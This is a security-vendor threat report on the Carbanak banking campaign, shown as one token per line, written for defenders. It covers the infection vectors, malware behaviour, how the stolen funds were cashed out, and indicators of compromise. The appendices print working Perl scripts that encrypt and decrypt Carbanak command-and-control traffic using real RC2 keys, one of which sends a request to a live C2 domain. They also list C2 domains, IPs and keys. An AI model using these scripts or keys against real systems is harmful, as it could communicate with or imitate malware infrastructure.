.

This
also
includes
video
captures
made
by
the
Anunak
malware
,
allowing
attackers
to
observe
the
behavior
of
users
of
certain
applications
.

Group
-
IB
is
one
of
the
leading
international
companies
specializing
in
preventing
and
investigat-
ing
high
-
tech
cyber
crimes
and
fraud
.

The
company
offers
a
range
of
services
on
preventing
financial
and
reputational
damages
,
consulting
and
auditing
of
information
security
systems
,
and
on
computer
forensics
.

The
company
also
develops
a
number
of
innovative
software
products
used
to
monitor
,
detect
and
prevent
emerging
cyber
threats
.

The
Group
-
IB
team
is
made
up
of
experts
with
unique
skills
and
solid
practical
experience
.

They
are
internationally
certified
by
CISSP
,
CISA
,
CISM
,
CEH
,
CWSP
,
GCFA
and
also
have
information
security
state
certificates
.

In
2013
,
computer
secu-
rity
incident
response
team
CERT
-
GIB
operated
by
Group
-
IB
became
a
member
of
FIRST
-
Forum
of
Incident
Response
and
Security
Teams
.

In
2013
,
the
company
became
a
member
of
the
international
cyber
security
alliance
IMPACT
(
In-
ternational
Multilateral
Partnership
Against
Cyber
Threats
)
.

www.group-ib.com
Fox
-
IT
creates
innovative
cyber
security
solutions
for
a
more
secure
society
.

We
are
dedicated
to
our
clients
,
our
values
,
and
our
integrity
.

Fox
-
IT
delivers
solutions
before
,
during
and
after
attacks
.

InTELL
is
the
real
-
time
cyber
intelligence
product
from
Fox
-
IT
.

It
provides
a
layered
intelligence
approach
:
actionable
data
feeds
into
operational
risk
decision
systems
.

Real
time
threat
information
allows
for
tactical
decisions
and
mitigation
.

InTELL
provides
a
full
real
-
time
insight
in
the
global
threat
landscape
.

We
base
our
intelligence
around
actor
attribu-
tion
.

This
angle
drives
a
unique
visibility
on
online
threats
-
InTELL
sees
threats
before
they
enter
the
botnet
.

Information
is
delivered
through
our
col-
laboration
portal
,
alerting
,
and
through
automated
feeds
powered
by
industry
standard
transports
.

www.fox-it.com

From
late
2013
onwards
,
several
banks
and
financial
institutions
have
been
attacked
by
an
unknown
group
of
cybercriminals
.

In
all
these
attacks
,
a
similar
modus
operandi
was
used
.

According
to
victims
and
the
law
enforcement
agencies
(
LEAs
)
involved
in
the
investigation
,
this
could
result
in
cumulative
losses
of
up
to
1
billion
USD
.

The
attacks
are
still
active
.

This
report
provides
a
technical
analysis
of
these
attacks
.

The
motivation
for
the
attackers
,
who
are
making
use
of
techniques
commonly
seen
in
Advanced
Persistent
Threats
(
APTs
)
,
appears
to
be
financial
gain
as
opposed
to
espionage
.

An
analysis
of
the
campaign
has
revealed
that
the
initial
infections
were
achieved
using
spear
phishing
emails
that
appeared
to
be
legitimate
banking
communications
,
with
Microsoft
Word
97
–
2003
(
.doc
)
and
Control
Panel
Applet
(
.CPL
)
files
attached
.

We
believe
that
the
attackers
also
redirected
to
exploit
kits
website
traffic
that
related
to
financial
activity
.

The
email
attachments
exploit
vulnerabilities
in
Microsoft
Office
2003
,
2007
and
2010
(
CVE-2012
-
0158
and
CVE-2013
-
3906
)
and
Microsoft
Word
(
CVE-2014-
1761
)
.

Once
the
vulnerability
is
successfully
exploited
,
the
shellcode
decrypts
and
executes
the
backdoor
known
as
Carbanak
.

Carbanak
is
a
remote
backdoor
(
initially
based
on
Carberp
)
,
designed
for
espionage
,
data
exfiltration
and
to
provide
remote
access
to
infected
machines
.

Once
access
is
achieved
,
attackers
perform
a
manual
reconnaissance
of
the
victim
's
networks
.

Based
on
the
results
of
this
operation
,
the
attackers
use
different
lateral
movement
tools
in
order
to
get
access
to
the
critical
systems
in
the
victim
s
infrastructure
.

They
then
install
additional
software
such
as
the
Ammyy
Remote
Administration
Tool
,
or
even
compromise
SSH
servers
.

Notably
,
some
of
the
latest
versions
of
the
analyzed
Carbanak
malware
appear
not
to
use
any
Carberp
source
code
.

Once
the
attackers
successfully
compromise
the
victim
s
network
,
the
primary
internal
destinations
are
money
processing
services
,
Automated
Teller
Machines
(
ATM
)
and
financial
accounts
.

In
some
cases
,
the
attackers
used
the
Society
for
Worldwide
Interbank
Financial
Telecommunication
(
SWIFT
)
network
to
transfer
money
to
their
accounts
.

In
others
,
Oracle
databases
were
manipulated
to
open
payment
or
debit
card
accounts
at
the
same
bank
or
to
transfer
money
between
accounts
using
the
online
banking
system
.

The
ATM
network
was
also
used
to
dispense
cash
from
certain
ATMs
at
certain
times
where
money
mules
were
ready
to
collect
it
.

As
part
of
the
attack
s
reconnaissance
phase
,
video
recordings
of
the
activities
of
bank
employees
,
particularly
system
administrators
,
were
made
.

The
videos
were
sent
to
the
C2
server
.

Please
note
that
the
attackers
abused
the
aforementioned
services
by
impersonating
legitimate
local
users
who
had
the
permissions
to
perform
the
actions
later
reproduced
by
the
cybercriminals
.

As
far
as
we
know
,
none
of
the
aforementioned
services
were
attacked
nor
was
any
specific
vulnerability
within
them
exploited
.

Of
the
100
banking
entities
impacted
at
the
time
of
writing
this
report
,
at
least
half
have
suffered
financial
losses
,
with
most
of
the
victims
located
in
Russia
,
USA
,
Germany
,
China
and
Ukraine
.

The
magnitude
of
the
losses
is
significant
.

For
example
,
one
victim
lost
approximately
$
7.3
million
(
USD
)
due
to
ATM
fraud
;
another
suffered
a
$
10
million
(
USD
)
loss
due
to
the
exploitation
of
its
online
banking
platform
.

Stolen
funds
were
transferred
out
of
the
affected
countries
to
bank
accounts
in
the
US
and
China
.

Additionally
some
of
the
C2
servers
have
log
entries
indicating
connections
to
systems
located
in
the
US
.

Telemetry
indicates
that
the
attackers
are
expanding
operations
to
other
regions
,
such
as
Asia
,
the
Middle
-
East
,
Africa
and
Europe
.

This
report
discusses
the
attack
vectors
,
infection
mechanisms
and
toolkits
used
by
the
attackers
to
exploit
the
network
after
the
initial
infection
,
as
well
as
the
operational
details
and
geographical
distribution
of
this
campaign
.

During
the
spring
of
2014
,
Kaspersky
Lab
was
involved
in
a
forensic
analysis
of
ATMs
dispensing
cash
to
people
located
near
them
but
with
no
physical
interaction
according
to
security
cameras
.

No
malware
was
detected
on
these
ATMs
.

However
,
Carberp
-
like
malware
was
found
on
a
computer
that
was
connected
to
them
via
VPN
.

Following
the
investigation
of
this
incident
,
in
the
summer
of
2014
,
Kaspersky
Lab
identified
the
same
Carberp
-
like
malware
in
another
investigation
involving
a
bank
,
where
criminals
were
able
to
gain
access
to
its
online
banking
systems
.

In
this
investigation
,
we
started
analyzing
all
the
computers
in
the
bank
's
infrastructure
in
order
to
find
the
source
of
the
infection
.

We
found
spear
phishing
emails
with
CPL
files
attached
that
,
after
a
successful
infection
,
install
the
same
Carberp
-
like
malware
we
had
previously
found
in
the
case
involving
the
ATMs
.

There
is
evidence
indicating
that
in
most
cases
the
network
was
compromised
for
between
two
to
four
months
,
and
that
many
hundreds
of
computers
within
a
single
victim
organization
may
have
been
infected
.

This
period
of
time
was
used
by
the
attackers
to
get
access
to
the
right
victims
and
critical
systems
,
and
to
learn
how
to
operate
their
tools
and
systems
to
get
the
cash
out
.

Carbanak
contains
an
espionage
component
that
allows
the
attackers
to
take
control
of
video
capabilities
on
the
victim
systems
.

Thanks
to
this
,
long
term
observation
and
reconnaissance
could
be
conducted
.

This
allowed
the
attackers
to
understand
the
protocols
and
daily
operational
tempo
of
their
targets
.

Based
on
this
understanding
,
exploitation
methodologies
and
mechanisms
were
developed
and
tailored
to
each
victim
.

All
observed
cases
used
spear
phishing
emails
with
Microsoft
Word
97
–
2003
(
.doc
)
files
attached
or
CPL
files
.

The
doc
files
exploit
both
Microsoft
Office
(
CVE-
2012
-
0158
and
CVE-2013
-
3906
)
and
Microsoft
Word
(
CVE-
2014
-
1761
)
.

There
are
indicators
that
point
to
a
possible
Chinese
origin
for
the
exploits
used
in
these
attachments
.

Command
and
Control
(
C2
)
servers
located
in
China
have
been
identified
in
this
campaign
.

In
addition
,
registration
information
for
some
of
the
domains
use
details
of
supposedly
Chinese
citizens
.

Obviously
,
all
this
could
just
be
a
red
herring
.

6
The
targets
were
all
employees
affiliated
to
the
affected
institution
.

The
spear
phishing
email
messages
appeared
legitimate
and
in
some
cases
were
sent
from
compromised
coworkers
accounts
.

In
this
way
compromised
systems
were
used
as
a
transmission
vector
.

Given
that
the
victims
were
mostly
Russian
-
speaking
financial
institutions
,
the
names
of
the
attachments
we
have
identified
were
generally
in
Russian
.

Examples
include
"
Соответствие
ФЗ-115
"
and
"
Приглашение
"
which
translate
into
"
Accordance
to
Federal
Law
"
and
"
Invitation
"
respectively
.

This
is
enough
to
induce
a
typical
employee
to
open
the
attachment
and
execute
the
malware
.

For
a
complete
list
of
file
names
see
Appendix
4
.

The
following
is
an
example
of
a
Carbanak
spear
phishing
email
.

Translated
.

In
this
case
,
the
attachment
was
a
CPL
file
compressed
using
the
Roshal
Archive
(
.rar
)
format
.

Once
the
remote
code
execution
vulnerability
is
successfully
exploited
,
it
installs
Carbanak
on
the
victim
's
system
.

The
complete
list
of
observed
spear
phishing
emails
can
be
found
in
Appendix
1
–
Spear
phishing
.

An
additional
infection
vector
that
we
believe
was
used
by
the
criminals
is
a
classical
drive
-
by
-
download
attack
.

We
have
found
traces
of
the
Null
and
the
RedKit
exploits
kits
.

The
image
above
translates
as
Country_name
,
All
visitors
,
Unique
visitors
,
Banned
visitor
,
Revoked
infections
,
Infected
.

Carbanak
is
a
backdoor
used
by
the
attackers
to
compromise
the
victim
's
machine
once
the
exploit
,
either
in
the
spear
phishing
email
or
exploit
kit
,
successfully
executes
its
payload
.

This
section
provides
a
functional
analysis
of
Carbanak
's
capabilities
.

Carbanak
copies
itself
into
"
%
system32%\com
"
with
the
name
"
svchost.exe
"
with
the
file
attributes
:
system
,
hidden
and
read
-
only
.

The
original
file
created
by
the
exploit
payload
is
then
deleted
.

To
ensure
that
Carbanak
has
autorun
privileges
the
malware
creates
a
new
service
.

The
naming
syntax
is
"
<
ServiceName
>
Sys
"
where
ServiceName
is
any
existing
service
randomly
chosen
,
with
the
first
character
deleted
.

For
example
,
if
the
existing
service
s
name
is
"
aspnet
"
and
the
visible
name
is
"
Asp.net
state
service
"
,
the
service
created
by
the
malware
would
be
"
aspnetSys
"
with
a
visible
name
of
"
Sp.net
state
service
"
.

Before
creating
the
malicious
service
,
Carbanak
determines
if
either
the
avp.exe
or
avpui.exe
processes
(
components
of
Kaspersky
Internet
Security
)
is
running
.

If
found
on
the
target
system
,
Carbanak
will
try
to
exploit
a
known
vulnerability
in
Windows
XP
,
Windows
Server
2003
,
Windows
Vista
,
Windows
Server
2008
,
Windows
7
,
Windows
8
,
and
Windows
Server
2012
,
CVE-2013
-
3660
,
for
local
privilege
escalation
.

We
believe
this
is
not
relevant
and
that
the
attackers
adapt
their
tools
to
the
victim
s
defenses
.

Carbanak
creates
a
file
with
a
random
name
and
a
.bin
extension
in
%
COMMON_APPDATA%\Mozilla
where
it
stores
commands
to
be
executed
.

Then
the
malware
gets
the
proxy
configuration
from
the
registry
entry
:
[
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet
Settings
]
and
the
Mozilla
Firefox
configuration
file
in
:
%
AppData%\Mozilla\Firefox\<ProfileName>\prefs.js
How
to
detect
Carbanak
One
of
the
best
methods
for
detecting
Carbanak
is
to
look
for
.bin
files
in
the
folder
:
..
\All
users\%AppData%\Mozilla\
The
malware
saves
files
in
this
location
that
will
later
be
sent
to
the
C2
server
when
an
internet
connection
is
detected
.

A
.BAT
script
for
detecting
infections
is
provided
in
the
Appendixes
.

Additionally
,
Carbanak
can
obtain
proxy
configuration
information
from
headers
sent
through
an
application
via
SOCKS
or
HTTP
.

Carbanak
injects
its
code
into
svchost.exe
.

Most
of
the
actions
described
below
happen
within
this
process
.

Carbanak
downloads
the
file
kldconfig.plug
from
its
C2
server
.

This
file
includes
the
names
of
the
processes
to
be
monitored
.

Once
the
system
is
infected
,
Carbanak
logs
keystrokes
and
takes
screenshots
every
20
seconds
.

This
monitoring
is
performed
by
intercepting
the
ResumeThread
call
.

To
enable
connections
to
the
infected
computer
using
the
Remote
Desktop
Protocol
(
RDP
)
,
Carbanak
sets
Termservice
service
execution
mode
to
Auto
.

Also
,
after
executing
this
service
,
it
modifies
the
executable
code
in
memory
in
order
to
establish
simultaneous
work
processes
for
both
remote
and
local
users
.

Modules
modified
in
this
process
are
:
termsrv.dll
,
csrsrv.dll
,
msgina.dll
and
winlogon.exe
.

If
Carbanak
detects
the
banking
application
BLIZKO
(
funds
transfer
software
)
in
the
infected
computer
,
it
sends
a
special
notification
to
its
C2
server
.

Carbanak
is
also
aware
of
the
IFOBS
banking
application
and
can
,
on
command
,
substitute
the
details
of
payment
documents
in
the
IFOBS
system
.

To
communicate
with
its
C2
server
,
Carbanak
uses
the
HTTP
protocol
with
RC2+Base64
encryption
,
adding
additional
characters
not
included
in
Base64
.

It
also
inserts
strings
with
different
extensions
(
.gif,.htm
,
etc
.
)
at
random
locations
in
the
HTTP
request
.

Example
of
a
typical
Carbanak
request
.

Carbanak
sends
its
collected
monitoring
data
to
its
C2
server
.

It
also
receives
commands
.

The
commands
are
compared
with
a
hash
table
;
if
there
is
a
match
Carbanak
performs
the
associated
action
.

In
order
to
render
the
malware
less
suspicious
,
the
latest
Carbanak
samples
are
digitally
signed
.

Known
samples
of
Carbanak
have
been
uploaded
to
VirusTotal
from
the
following
locations
.

Known
exploits
that
download
Carbanak
have
been
uploaded
to
VirusTotal
mostly
from
Russia
.

According
to
KSN
data
,
victims
are
distributed
geographically
as
follows
.

It
is
also
very
interesting
to
see
the
distribution
of
Carbanak
submissions
to
VirusTotal
.

This
way
we
can
identify
periods
when
the
malware
came
to
the
attention
of
potential
victims
and
security
researchers
,
and
helps
to
reveal
peaks
in
the
group
's
activity
.

Since
the
beginning
of
this
case
,
Kaspersky
Lab
has
worked
in
cooperation
with
the
LEAs
investigating
it
.

During
the
investigation
LEAs
shared
with
us
statistical
data
from
their
research
that
helped
us
to
complete
our
picture
of
the
campaign
.

The
following
map
shows
targets
'
IP
addresses
found
in
three
of
Carbanak
's
Linux
servers
at
the
end
of
October
2014
.

Carbanak
uses
different
tools
on
infected
systems
,
each
one
with
a
different
purpose
.

There
appears
to
be
a
preference
for
the
Ammyy
Admin
remote
administration
tool
for
remote
control
.

Specifically
,
the
attackers
have
been
detected
uploading
:
Ammyy
Admin
3.5
(
f8cd52b70a11a1fb3f29c6f89ff971ec
)
as
svchost.exe
It
is
believed
that
the
attackers
used
this
remote
administration
tool
because
it
is
commonly
whitelisted
in
the
victims
'
environments
as
a
result
of
being
used
regularly
by
administrators
.

In
another
instance
,
a
Secure
Shell
(
SSH
)
backdoor
was
used
to
communicate
with
the
C2
server
in
190.97.165.126
(
operatemesscont.net
)
.

This
indicates
that
the
attackers
did
not
limit
themselves
to
Microsoft
Windows
environments
.

In
this
case
,
the
victim
used
the
Telnet
/
SSH
client
PuTTY
to
connect
to
the
server
,
and
the
attackers
recompiled
the
machine
's
SSH
daemon
with
a
backdoor
so
they
could
gain
direct
access
.

Logs
for
these
tools
indicate
that
they
were
accessed
from
two
different
IPs
,
probably
used
by
the
attackers
,
and
located
in
Ukraine
and
France
.

We
have
also
found
traces
of
many
different
tools
used
by
the
attackers
inside
the
victim
s
network
to
gain
control
of
additional
systems
,
such
as
Metasploit
,
PsExec
or
Mimikatz
.

There
appear
to
be
four
distinct
types
of
C2
servers
.

Server
rotation
occurs
more
or
less
on
a
biweekly
basis
.

For
a
complete
list
of
identified
Carbanak
servers
please
check
the
regularly
updated
Carbanak
IOC
document
.

The
current
list
of
IOCs
is
provided
at
Appendix
3
in
his
document
.

Some
of
these
C2
servers
are
responsible
for
dropping
Ammyy
(
configuration
and
executable
files
)
,
the
KLG
plugin
configuration
(
list
of
processes
to
monitor
)
and
the
VNC
server
(
both
32
and
64
bits
to
be
injected
in
rundll
)
.

In
one
of
the
observed
servers
there
was
also
a
Metasploit
module
.

Victim
systems
are
catalogued
in
the
servers
'
databases
.

The
victims
belong
to
a
number
of
different
communities
,
thus
simplifying
administration
.

In
all
,
85
different
victims
belonging
to
seven
communities
were
found
.

Additionally
,
the
malicious
servers
contain
video
files
that
capture
a
victim
s
activity
.

While
the
videos
are
stored
using
a
compressed
format
which
provides
poor
image
quality
,
the
selected
format
minimizes
upload
bandwith
and
is
of
sufficient
quality
for
the
attackers
to
understand
the
victims
'
activities
.

The
video
file
naming
conventions
used
the
name
of
the
application
in
the
foreground
(
e.g.
,
Outlook
,
Cmd
,
etc
.
)
and
only
recorded
user
activity
.

This
helped
the
attackers
to
both
navigate
to
files
of
interest
and
to
discard
superfluous
files
.

Using
the
intelligence
gained
from
video
and
other
monitoring
techniques
,
the
attackers
developed
an
operational
picture
of
the
victim
's
workflow
,
tooling
and
practices
.

This
picture
helps
the
attackers
to
deploy
their
malicious
operations
,
for
example
.

In
general
,
the
attackers
demonstrated
great
versatility
,
using
attack
methodologies
best
suited
to
a
specific
victim
's
operational
methodology
.

However
,
they
seemed
to
deliberately
limit
the
amount
of
money
stolen
per
victim
to
$
10
million
USD
.

This
limit
may
be
explained
as
the
maximum
amount
of
money
that
can
be
transferred
via
mule
services
,
or
the
maximum
amount
of
money
that
is
budgeted
in
banks
for
fraud
risks
in
order
to
minimize
the
chances
of
LEAs
and
the
bank
s
anti
-
fraud
teams
from
doing
a
full
blown
analysis
.

Sensitive
bank
documents
have
be
found
on
the
servers
that
were
controlling
Carbanak
.

They
included
classified
emails
,
manuals
,
crypto
keys
,
passwords
and
so
on
.

For
example
,
the
file
in
the
above
figure
has
KVC
(
key
verification
codes
)
keys
that
are
used
by
ATMs
to
check
the
integrity
of
the
PIN
numbers
of
its
users
.

In
other
cases
involving
ATMs
,
the
criminals
were
able
to
control
computers
that
had
access
to
the
internal
ATM
network
.

If
the
bank
had
enabled
remote
access
to
ATMs
,
the
criminals
started
using
this
access
to
remotely
withdraw
cash
.

Criminals
used
no
malware
to
operate
the
ATM
dispenser
;
instead
they
used
standard
utilities
to
control
and
test
ATM
equipment
.

Malware
targeting
the
finance
industry
(
both
companies
and
consumers
)
continues
to
evolve
.

The
Carbanak
malware
used
in
the
on
-
going
campaign
described
in
this
report
has
been
very
successful
in
terms
of
generating
revenue
.

Of
particular
interest
are
the
attack
methods
,
similar
to
those
used
in
sophisticated
cyber
-
espionage
APTs
.

As
such
,
they
represent
a
new
and
disturbing
trend
in
the
cybercrime
market
of
increasing
attack
sophistication
.

Despite
increased
awareness
of
cybercrime
within
the
financial
services
sector
,
it
appears
that
spear
phishing
attacks
and
old
exploits
(
for
which
patches
have
been
disseminated
)
remain
effective
against
larger
companies
.

Attackers
always
use
this
minimal
effort
approach
in
order
to
bypass
a
victim
s
defenses
.

Advanced
control
and
fraud
detection
systems
have
been
used
for
years
by
the
financial
services
industry
.

However
,
these
focus
on
fraudulent
transactions
within
customer
accounts
.

The
Carbanak
attackers
bypassed
these
protections
,
by
for
example
,
using
the
industry
-
wide
funds
transfer
(
the
SWIFT
network
)
,
updating
balances
of
account
holders
and
using
disbursement
mechanisms
(
the
ATM
network
)
.

In
neither
of
these
cases
did
the
attackers
exploit
a
vulnerability
within
the
service
.

Instead
,
they
studied
the
victim
s
internal
procedures
and
pinpointed
who
they
should
impersonate
locally
in
order
to
process
fraudulent
transactions
through
the
aforementioned
services
.

It
is
clear
that
the
attackers
were
very
familiar
with
financial
services
software
and
networks
.

As
part
of
an
automated
reconnaissance
phase
,
the
Carbanak
malware
checked
victim
systems
for
the
presence
of
specialized
and
specific
banking
software
.

Only
after
the
presence
of
banking
systems
was
confirmed
,
were
victims
further
exploited
.

To
date
,
attacks
against
approximately
300
IP
addresses
around
the
world
have
been
observed
on
analyzed
C2s
.

It
is
possible
that
these
attacks
were
coordinated
to
maximize
returns
prior
to
industry
-
wide
information
sharing
and
the
implementation
of
countermeasures
.

Existing
telemetry
indicates
that
the
Carbanak
attackers
are
trying
to
expand
operations
to
other
Baltic
and
Central
Europe
countries
,
the
Middle
East
,
Asia
and
Africa
.

Carbanak
may
be
responsible
for
losses
as
high
as
$
1
billion
USD
.

We
believe
that
the
Carbanak
campaign
is
a
clear
indicator
of
a
new
era
in
cybercrime
in
which
criminals
use
APT
techniques
directly
against
the
financial
industry
instead
of
through
its
customers
.

APTs
are
not
only
for
stealing
information
anymore
.

Decryptor
#
!
/usr
/
bin
/
perl
-w
#
Work
with
Carbanak
c2
use
strict
;
use
warnings
;
use
Crypt::CBC
;
use
Crypt::Cipher::RC2
;
use
MIME::Base64
;
use
LWP::Simple
;
#
my
$
c2
=
"
worldnewsonline.pw
"
;
#
my
$
reguest
=
"
1234567890123456
"
;
my
$
reguest_was
=
"
JybDHkfWGURJPuWeUpPMX
/
ca9BThbDim0Hdk/9YzkJS7m8a19tz
QwZxo1vvQ
/
r/7SHJcCm4tdpZGp.dmDwKf
MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK
tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V
fyUz.shtml
"
;
$
reguest_was
=
~
tr/\/\=\&\?//d
;
my
$
replace
=
"
"
;
my
$
find=".shtml
"
;
$
reguest_was
=
~
s/\Q$find\E//g
;
$
reguest_was
=
~
s/-/+/g
;
$
reguest_was
=
~
s/\./\//g
;
print
"
$
reguest_was\n
"
;
my
$
iv
=
substr
$
reguest_was,0,8
;
$
reguest_was
=
substr
$
reguest_was,8
;
my
$
base64_decoded1
=
decode_base64("$reguest_was
"
)
;
print
"
$
base64_decoded1\n
"
;
my
$
length
=
length($base64_decoded1
)
;
print
"
length
is
:
$
length\n
"
;
print
"
iv
is
:
$
iv\n
"
;
print
"
req
is
:
$
reguest_was\n
"
;
my
$
base64_decoded
=
"
$
{
base64_decoded1
}
"
;
my
$
key
=
"
vfDGbiwmiqdN6E2N
"
;
#
my
$
key
=
"
1234567812345678
"
;
my
$
cipher
=
Crypt::CBC->new
(
-cipher=>'Cipher::RC2
'
,
-header=>'none
'
,
-literal_key=>1
,
-key=>$key
,
–
keysize=>16
,
-iv=>$iv
)
;
my
$
plaintext
=
$
cipher->decrypt($base64_decoded
)
;
print
"
Decode:\
n$plaintext\n
"
;
#
Decrypt
is
#
HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data
=
listprocess|pro
cess
=
svchost.exe|idproce
ss=4294967295|lBHReFDRDfYG
#
my
$
url
=
"
http://$c2/$base64_encoded
"
;
#
print
$
url
;
#
my
$
contents
=
get($url
)
;
#
print
$
contents
;
Encryptor
#
!
/usr
/
bin
/
perl
-w
#
Decrypt
Carbanak
c2
responce
use
strict
;
use
warnings
;
use
Crypt::CBC
;
use
Crypt::Cipher::RC2
;
use
MIME::Base64
;
use
LWP::Simple
;
my
$
c2
=
"
worldnewsonline.pw
"
;
my
$
reguest
=
"
HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data
=
listprocess|pro
cess
=
svchost.exe|idproces
s=4294967295|lBHReFDRDfYG
"
;
my
$
iv
=
"
JybDHkfW
"
;
#
should
be
random
my
$
key
=
"
vfDGbiwmiqdN6E2N
"
;
my
$
cipher
=
Crypt::CBC->new
(
-cipher=>'Cipher::RC2
'
,
-header=>'none
'
,
-literal_key=>1
,
-key=>$key
,
–
keysize=>16
,
-iv=>$iv
)
;
my
$
ciphertext
=
$
cipher->encrypt($reguest
)
;
my
$
base64_encoded
=
encode_base64("$ciphertext
"
)
;
$
base64_encoded
=
~
s/\x0a//g
;
$
base64_encoded
=
~
s/\//\./g
;
$
base64_encoded
=
~
s/\+/-/g
;
my
$
base64_encoded_ex
=
"
$
{
iv}${base64_encoded}.php
"
;
my
$
url
=
"
http://$c2/${base64_encoded_ex
}
"
;
print
$
url
;
#
http://worldnewsonline.pw/
GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp
ZGp
.

dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG
ZCBPj.vd08D
UENC5o
.
AE4VfyUz
..
php|
my
$
contents
=
get($url
)
;
print
$
contents
;
Decrypt
Files
from
CnC
#
!
/usr
/
bin
/
perl
-w
#
Decrypt
Files
from
sended
from
c2
use
strict
;
use
warnings
;
use
Crypt::CBC
;
use
Crypt::Cipher::RC2
;
use
MIME::Base64
;
use
LWP::Simple
;
my
$
file=$ARGV[0
]
;
open(DATA
,
"
<
$
file
"
)
;
open(DATA1
,
"
<
$
file
"
)
;
open(DATA2
,
"
<
$
file
"
)
;
binmode(DATA
)
;
binmode(DATA1
)
;
binmode(DATA2
)
;
my
(
$
data
,
$
n
,
$
offset
)
;
while
(
(
$
n
=
read
DATA
,
$
data
,
1
,
$
offset
)
!
=
0
)
{
$
offset
+
=
$
n
;
}
my
$
length
=
$
offset
;
my
$
iv_len
=
read
DATA1
,
my
$
iv
,
8
,
0
;
read
DATA2
,
my
$
crypt_data
,
$
length
,
8
;
my
$
key
=
"
vfDGbiwmiqdN6E2N
"
;
my
$
cipher
=
Crypt::CBC->new
(
-cipher=>'Cipher::RC2
'
,
-header=>'none
'
,
-literal_key=>1
,
-key=>$key
,
–
keysize=>16
,
-iv=>$iv
)
;
my
$
plaintext
=
$
cipher->decrypt($crypt_data
)
;
print
"
$
plaintext
"
;
@echo
off
for
/f
%
%
a
in
(
'
hostname
'
)
do
set
"
name=%%a
"
echo
%
name%
del
/f
%
name%.log
2
>
nul
if
exist
"
c:\Documents
and
settings\All
users\application
data\
mozilla\*.bin
"
echo
"
BIN
detected
"
>
>
%
name%.log
if
exist
%
SYSTEMROOT%\System32\com\svchost.exe
echo
"
COM
detected
"
>
>
%
name%.log
if
exist
"
c:\ProgramData\mozilla\*.bin
"
echo
"
BIN2
detected
"
>
>
%
name%.log
if
exist
%
SYSTEMROOT%\paexec
*
echo
"
Paexec
detected
"
>
>
%
name%.log
if
exist
%
SYSTEMROOT%\Syswow64\com\svchost.exe
echo
"
COM64
detected
"
>
>
%
name%.log
SC
QUERY
state=
all
|
find
"
SERVICE_NAME
"
|
findstr
"
Sys$
"
if
q%ERRORLEVEL%
=
=
q0
SC
QUERY
state=
all
|
find
"
SERVICE_NAME
"
|
findstr
"
Sys$
"
>
>
%
name%.log
if
not
exist
%
name%.log
echo
Ok
>
%
name%.log
xcopy
/y
%
name%.log
"
\\<IP>\logVirus
This
section
contains
details
on
spear
phishing
emails
sent
by
the
attackers
to
infect
victims
.

MD5
:
8fa296efaf87ff4d9179283d42372c52
Name
of
attachment
:
Соответствие
ФЗ-
115
от
24.06.2014г.doc
Drops
executable
:
MD5
:
a1979aa159e0c54212122fd8acb24383
(
Carbanak
)
Compiled
Mon
Apr
04
20:00:57
2011
(
Probably
fake
)
C2
on
update-
java.net
C2
key
1234567812345678
RDP
on
37.235.54.48:443
MD5
:
665b6cb31d962aefa3037b5849889e06
Name
of
attachment
:
Запрос.doc
Drops
executable
:
MD5
:
4afafa81731f8f02ba1b58073b47abdf
(
Carbanak
)
Compiled
Tue
Jul
01
03:20:06
2014
Connects
to
:
financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc
Z
/
Gafh8U1W805Lo0N
/
np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm
(
185.10.58.175
)
C2
on
financialnewsonline.pw
,
financialwiki.pw
C2
key
TXeyuryWcIuzxkWnyu
RDP
on
185.10.56.59:443
MD5
:
2c395f211db2d02cb544448729d0f081
Name
of
attachment
:
new.doc
Drops
executable
:
MD5
:
551d41e2a4dd1497b3b27a91922d29cc
(
Carbanak
)
Compiled
Mon
Aug
04
01:10:40
2014
Connects
to
:
http://worldnewsonline.pw/JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7
m8a19tzQwZxo1vvQ
/
r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6
eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml
C2s
on
worldnewsonline.pw
,
worldnews24.pw
C2
key
JDvkyfhZxkMmDSwUkqvReIvC
RDP
on
185.10.56.59:443
MD5
:
31e16189e9218cb131fdb13e75d0a94f
Name
of
attachment
:
Анкета-
Заявление.doc
Drops
executable
:
MD5
:
4e107d20832fff89a41f04c4dff1739b
(
Carbanak
)
C2
on
public-
dns.us
C2
key
1234567812345678
RDP
on
37.235.54.48:443
MD5
:
db83e301564ff613dd1ca23c30a387f0
Name
of
attachment
:
Соответствие
ФЗ-
115
от
21.07.2014г.doc
Drops
executable
:
MD5
:
cb915d1bd7f21b29edc179092e967331
(
Carbanak
)
Compiled
Tue
Apr
08
05:44:12
2014
Connects
to
:
datsun-
auto.com
/
bDqxEs
/
Ta6IPJq3zqmRY-
.5/8SgGLA-
F
/
I9CstBYT1rK7kx.440Sbtru.cgi?QVzF
=
tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD-
Ucygbtzv4=f8fx
MD5
:
f88a983fc0ef5bb446ae63250e7236dd
Name
of
attachment
:
Приглашение.msg
Drops
executable
:
MD5
:
3dc8c4af51c8c367fbe7c7feef4f6744
(
Carbanak
)
Compiled
Fri
Aug
08
00:48:07
2014
C2s
on
worldnewsonline.pw
,
worldnews24.pw
C2
key
vfDGbiwmiqdN6E2N
RDP
on
185.10.56.59:443
MD5
:
c4a6a111a070856c49905d815f87ab49
Name
of
attachment
:
ЧОСВЯЮООАГЖЦСЦЧОЧю
Drops
executable
:
MD5
:
cb915d1bd7f21b29edc179092e967331
(
Carbanak
)
Connects
to
:
GET
/cBAWFvkXi94QxShRTaVVn
/
YzAxD
/
X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi
Busj=2OVj&9GP
=
a5houGz&K.F
=
